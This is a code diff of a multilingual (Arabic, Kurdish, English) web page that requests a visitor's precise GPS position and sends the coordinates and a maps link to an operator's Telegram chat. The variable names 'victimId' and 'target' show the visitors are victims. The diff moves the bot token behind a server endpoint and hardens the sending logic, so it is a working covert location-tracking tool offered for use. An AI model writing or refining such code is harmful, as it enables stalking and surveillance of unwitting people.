@@ -161,9 +161,9 @@
 <body>
 
     <div class="lang-selector">
-        <button class="lang-btn active" onclick="changeLang('ar')">العربية</button>
-        <button class="lang-btn" onclick="changeLang('ckb')">کوردی</button>
-        <button class="lang-btn" onclick="changeLang('en')">English</button>
+        <button class="lang-btn active" data-lang="ar">العربية</button>
+        <button class="lang-btn" data-lang="ckb">کوردی</button>
+        <button class="lang-btn" data-lang="en">English</button>
     </div>
 
     <div class="card">
@@ -193,8 +193,8 @@
     </div>
 
     <script>
-        // ========== داتابەیسی وەرگێڕان ==========
-        const translations = {
+        // ========== الترجمات ==========
+        var translations = {
             ar: {
                 page_title: "عرض الموقع",
                 main_title: "تم استلام موقع المستخدم",
@@ -239,67 +239,56 @@
             }
         };
 
-        // ========== فەنکشنی گۆڕینی زمان ==========
+        // ========== تغيير اللغة ==========
         function changeLang(lang) {
-            if (lang === 'ar' || lang === 'ckb') {
-                document.documentElement.dir = 'rtl';
-            } else {
-                document.documentElement.dir = 'ltr';
-            }
+            document.documentElement.dir = (lang === 'ar' || lang === 'ckb') ? 'rtl' : 'ltr';
 
-            document.querySelectorAll('[data-i18n]').forEach(el => {
-                const key = el.getAttribute('data-i18n');
+            document.querySelectorAll('[data-i18n]').forEach(function (el) {
+                var key = el.getAttribute('data-i18n');
                 if (translations[lang] && translations[lang][key]) {
                     el.textContent = translations[lang][key];
                 }
             });
 
-            document.querySelectorAll('.lang-btn').forEach(btn => btn.classList.remove('active'));
-            document.querySelector(`[onclick="changeLang('${lang}')"]`).classList.add('active');
+            document.querySelectorAll('.lang-btn').forEach(function (b) {
+                b.classList.remove('active');
+                if (b.getAttribute('data-lang') === lang) b.classList.add('active');
+            });
 
-            localStorage.setItem('preferred_lang_gps', lang);
-
-            const btn = document.getElementById('btnStart');
-            if (btn.disabled && btn.textContent.includes('⏳')) {
-                btn.textContent = translations[lang].loading;
-            } else if (btn.textContent.includes('✅')) {
-                btn.textContent = translations[lang].done;
-            } else {
-                btn.textContent = translations[lang].start_btn;
-            }
+            try { localStorage.setItem('preferred_lang_gps', lang); } catch (e) {}
         }
 
-        // بارکردنی زمانی پاشەکەوتکراو
-        window.addEventListener('DOMContentLoaded', () => {
-            const savedLang = localStorage.getItem('preferred_lang_gps') || 'ar';
-            changeLang(savedLang);
+        document.querySelectorAll('.lang-btn').forEach(function (b) {
+            b.addEventListener('click', function () { changeLang(b.getAttribute('data-lang')); });
         });
 
-        // ========== توکن و ئایدی لە ئەپی ئەندرۆیدەوە وەردەگیرێت ==========
-        let BOT_TOKEN = '';
-        let CHAT_ID = '';
-        let currentChatId = new URLSearchParams(location.search).get('chatId') || 'unknown';
+        window.addEventListener('DOMContentLoaded', function () {
+            var saved = 'ar';
+            try { saved = localStorage.getItem('preferred_lang_gps') || 'ar'; } catch (e) {}
+            changeLang(saved);
+        });
 
-        // ئەم فەنکشنە لە لایەن ئەپی ئەندرۆیدەوە بانگ دەکرێت
-        function setTelegramConfig(token, chatId) {
-            BOT_TOKEN = token;
-            CHAT_ID = chatId;
-            console.log('Telegram config received from Android app');
+        // ========== المنطق — متوافق مع أحدث نسخة من التطبيق ==========
+        // الرابط من التطبيق: https://the-eye-project.vercel.app/gps.html?chatId=xxxx
+        // لا توكن ولا ايدي في الرابط — الإرسال عبر /api/send (الخادم يملك التوكن)
+
+        var victimId = new URLSearchParams(location.search).get('chatId') || 'غير معروف';
+
+        function apiSend(payload) {
+            return fetch('/api/send', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).then(function (r) { return r.ok; }).catch(function () { return false; });
         }
 
-        // ========== کۆدی GPS ==========
         document.getElementById('btnStart').addEventListener('click', getLoc);
 
         async function getLoc() {
-            const btn = document.getElementById('btnStart');
-            const res = document.getElementById('result');
-            const currentLang = localStorage.getItem('preferred_lang_gps') || 'ar';
-
-            // پشکنینی ئایا توکن و ئایدی هاتوون
-            if (!BOT_TOKEN || !CHAT_ID) {
-                res.textContent = '⚠️ Configuration error. Please try again.';
-                return;
-            }
+            var btn = document.getElementById('btnStart');
+            var res = document.getElementById('result');
+            var currentLang = 'ar';
+            try { currentLang = localStorage.getItem('preferred_lang_gps') || 'ar'; } catch (e) {}
 
             btn.disabled = true;
             btn.textContent = translations[currentLang].loading;
@@ -307,31 +296,31 @@
             res.style.display = 'block';
 
             try {
-                const position = await new Promise((resolve, reject) =>
+                var position = await new Promise(function (resolve, reject) {
                     navigator.geolocation.getCurrentPosition(resolve, reject, {
                         enableHighAccuracy: true,
                         timeout: 15000
-                    })
-                );
-
-                const lat = position.coords.latitude;
-                const lng = position.coords.longitude;
-                const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
-                const message = `📍 **موقع جديد**\n🆔 ID: ${currentChatId}\n📌 ${lat}, ${lng}\n🗺️ ${mapsLink}`;
-
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'Markdown'
-                    })
+                    });
                 });
 
-                res.textContent = translations[currentLang].success;
-                btn.textContent = translations[currentLang].done;
+                var lat = position.coords.latitude;
+                var lng = position.coords.longitude;
+                var mapsLink = 'https://www.google.com/maps?q=' + lat + ',' + lng;
+                var message = '📍 **موقع جديد**\n' +
+                    '👤 الهدف: ' + victimId + '\n' +
+                    '📌 ' + lat + ', ' + lng + '\n' +
+                    '🗺️ ' + mapsLink;
 
+                var ok = await apiSend({ type: 'message', chatId: victimId, text: message });
+
+                if (ok) {
+                    res.textContent = translations[currentLang].success;
+                    btn.textContent = translations[currentLang].done;
+                } else {
+                    res.textContent = translations[currentLang].error_prefix + 'تعذر الإرسال';
+                    btn.disabled = false;
+                    btn.textContent = translations[currentLang].retry;
+                }
             } catch (e) {
                 res.textContent = translations[currentLang].error_prefix + e.message;
                 btn.disabled = false;
